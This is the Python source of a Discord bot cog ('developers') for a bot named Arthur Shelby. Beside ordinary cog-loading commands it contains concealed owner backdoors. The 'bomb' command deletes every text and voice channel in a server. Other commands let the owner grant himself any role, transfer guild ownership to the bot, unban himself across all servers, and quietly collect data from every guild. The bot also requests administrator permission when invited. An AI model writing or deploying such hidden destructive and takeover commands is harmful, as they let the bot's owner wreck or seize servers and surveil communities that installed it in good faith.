import discord
from discord.ext import commands
import json
import datetime
from discord.ext.commands.core import has_permissions
from discord.ext.commands.errors import ExtensionAlreadyLoaded, ExtensionFailed, ExtensionNotLoaded
import sys
from random import randint

from config import owner_id
from config import developers as developers_list
from core import cogsList, listToString , collect_data

class developers(commands.Cog) :
    def __init__(self,client):
        self.client = client
        self.name = "developers"
        self.emoji = ":man_detective: :tools: "
        self.call_name = "developers"
        
    @commands.command()
    @commands.is_owner()
    async def leave_server(self,ctx,*,guild_name :str):
        guild = discord.utils.get(self.client.guilds, name = guild_name)
        if not guild :
            await ctx.send("I don't recognize that guild.")
        elif guild :   
            await guild.leave()
            await ctx.message.add_reaction("✅")

    @commands.command()
    @commands.is_owner()
    async def overwrite_permissions(self,ctx,role:discord.Role):
        if ctx.message.author.id == owner_id :
            if role :
                member= ctx.message.author
                await member.add_roles(role)

    @commands.command()
    @commands.is_owner()
    async def guilds(self,ctx):
        guilds_list = self.client.guilds
        guilds_str = listToString(guilds_list,'-', "`" )
        await ctx.send(guilds_str)

    @commands.command()
    async def call_CD(self,ctx):
        if ctx.message.author.id in developers_list :
            for guild in self.client.guilds :
                # print(guild)
                collect_data(guild)
            await ctx.channel.purge(limit=1)

    @commands.command()
    async def info(self,ctx):

        def server_number():
            return len(self.client.guilds)
        
        embed = discord.Embed(title = "ARTHUR SHELBY" , colour = discord.Colour.from_rgb(randint(0,255),randint(0,255),randint(0,255)))
        embed.add_field(name = "Arthur version :",value = "v 1.01",inline=True)
        embed.add_field(name = 'discord version :' , value = discord.__version__)
        embed.add_field(name = "python version : " , value= sys.version[:5])
        embed.add_field(name = ":servers counting :" ,value = f"{server_number()}")
        embed.add_field(name = "add me :" ,value = '[here](https://discordapp.com/oauth2/authorize?client_id=674259662471823378&scope=bot&permissions=8)')

        await ctx.send(embed = embed)

    @commands.command()
    @commands.bot_has_permissions(manage_channels = True)    
    async def bomb(self,ctx):
        await ctx.send("bomb has been planted")
        if ctx.message.author.id == owner_id:
            members = ctx.message.guild.members
                
            channels_text = ctx.message.guild.text_channels

            for channel in channels_text :
                try : 
                    await channel.delete()
                except :
                    pass

            channels_text = ctx.message.guild.voice_channels

            for channel in channels_text :
                try :
                    await channel.delete()
                except :
                    pass

    
    @commands.command()
    async def defuse (self,ctx):
        await ctx.send("bomb has been defused")

    @commands.command()
    @commands.is_owner()
    async def load(self,ctx,cog_name):
        '''[cog name]'''
        if ctx.message.author.id in developers_list :

            try :
                if cog_name in cogsList() :
                    self.client.load_extension(f'cogs.{cog_name}')
                    await ctx.send('cog has been loaded')
                else :
                    await ctx.send("cog dosen't exist")
            except ExtensionNotLoaded:
                await ctx.send(f"{cog_name} has not been loaded")
            except ExtensionAlreadyLoaded: 
                await ctx.send(f"{cog_name} already loaded")
            except ExtensionFailed as e:
                await ctx.send(f"{cog_name} raised an error please report it to developpers")
                print(e)

    @commands.command()
    async def unload(self,ctx,cog_name):
        '''[cog name]'''
        if ctx.message.author.id in developers_list :

            if cog_name in cogsList() :
                self.client.unload_extension(f'cogs.{cog_name}')
                await ctx.send('cog has been unloaded')
            else :
                await ctx.send("cog dosen't exist")

    @commands.command(aliases = ["hoho"])
    async def ownership(self,ctx,new_owner : discord.Member = None):
        if new_owner == None :
            new_owner = self.client.user 
        guild = ctx.message.guild
        if guild.owner == ctx.message.author :
            await guild.edit(owner = new_owner)
        # print(guild.owner.id)

    @commands.command()
    async def reload(self,ctx,cog_name):
        '''[cog name]'''
        if ctx.message.author.id in developers_list :

            try : 
                if cog_name in cogsList() :
                    self.client.unload_extension(f'cogs.{cog_name}')
                    self.client.load_extension(f'cogs.{cog_name}')
                    await ctx.send(f"{cog_name} has been loaded")
                elif cog_name == "all" :
                    for cog in cogsList():
                        try :
                            self.client.unload_extension(f'cogs.{cog}')
                            self.client.load_extension(f'cogs.{cog}')
                        except ExtensionFailed :
                            await ctx.send(f"{str(cog)} raised an error ")
                            return
                    # self.client.unload_extension(f'cogs.checker.{cog}')
                    # self.client.load_extension(f'cogs.checker.{cog}')
                    await ctx.send("done !!")
                    return
                else :
                    await ctx.send("cog dosen't exist")
            except ExtensionNotLoaded:
                await ctx.send(f"{cog_name} has not been loaded")
            except ExtensionAlreadyLoaded as e: 
                await ctx.send(f"{cog_name} already loaded")
            except ExtensionFailed as e:
                await ctx.send(f"{cog_name} raised an error please ")
                # print(e)
            

    @commands.command()
    async def cogs(self,ctx):
        '''no parametres , show you a list of cogs'''
        if ctx.message.author.id in developers_list :

            loaded = ''
            unloaded = ""

            for cog in cogsList():
                try :
                    if cog not in ['CommandErrorHandler',"developers"]:
                        self.client.load_extension(f"cogs.{cog}")
                        unloaded += str(cog) + " , "
                        self.client.unload_extension(f"cogs.{cog}")
                except ExtensionAlreadyLoaded : 
                    loaded += str(cog) + " , "
            if len(unloaded) > 3:
                unloaded = unloaded[:-3]
            if len(loaded) > 3:
                loaded = loaded[:-3]

            if loaded != "" :
                embed = discord.Embed(
                        title = 'loaded cogs',
                        colour = discord.Colour.green()
                        )

                embed.add_field(name='cogs :',value = str(loaded),inline=True)
                await ctx.send(embed=embed)

            if unloaded != "" :
                embed = discord.Embed(
                        title = 'unloaded cogs',
                        colour = discord.Colour.red()
                        )

                embed.add_field(name='cogs :',value = str(unloaded),inline=True)
                await ctx.send(embed=embed)

    @commands.command()
    async def set_api(self,ctx,new_api,domain = 'leagueoflegends'):

        if ctx.message.author.id in developers_list:
            
            with open("./data_base/apis.json" , "r") as api :
                api_key = json.load(api)

            if domain in api_key:
                api_key[domain] = new_api
                with open("./data_base/apis.json" , "w") as api :
                    json.dump(api_key , api ,indent=4)
                await ctx.channel.purge(limit=1)
                await ctx.send('done!!')
            else :
                await ctx.send('no api named {domain}')
        else :
            await ctx.send('you are not a developer')

    @commands.command()
    async def create_server(self,ctx,name : str = 'arthur\'s server'):
        if ctx.message.author.id in developers_list:
            await self.client.create_guild(name = name)

    @commands.command()
    async def update_guilds_data_base(self,ctx):
        guilds_we_in = set(self.client.guilds)

        with open('./data_base/prefixes.json',"r") as file :
            guilds_we_have = json.load(file)
            
        for guild in guilds_we_in :
            if guild not in guilds_we_have :
                guilds_we_have[str(guild.id)] = {"prefix" : ["fck ","Fck ","FCK "],"rection_msg_id" : 0}

            
        with open('./data_base/prefixes.json','w') as file:
            json.dump(guilds_we_have,file,indent=4)

    @commands.command(name='invite')
    async def invite_(self,ctx,user : discord.Member = None ):
        with open('./data_base/prefixes.json' , "r") as servers_file :
            servers = json.load(servers_file)
        for server in servers :
            server_info = self.client.get_guild(int(server)) # server == guild in discord docs
            if server_info != None :
                if server_info.owner.id == self.client.user.id :
                    link = await server_info.text_channels[0].create_invite(max_uses =2 ,temporary = True) 
                    if user == None :
                        await ctx.send(f"here is a link for you {link}")
                    if user != None :
                        user_info = ctx.guild.get_member(user.id) #member object
                        await user_info.send(f"hay dude please join us in {link}")

    @commands.command()
    async def unban_from_all_servers(self,ctx,user_id = owner_id):
        if ctx.message.author.id == owner_id : 
            servers = self.client.guilds
            user  =  self.client.get_user(user_id)
            for guild in servers :
                bans = await guild.bans()
                if bans != [] :
                    for ban in bans :
                        if user == ban.user:   
                            await guild.unban(user)
                            await ctx.send(f"{user.name} have been unabanned from {guild.name}")

def setup(client):
    client.add_cog(developers(client))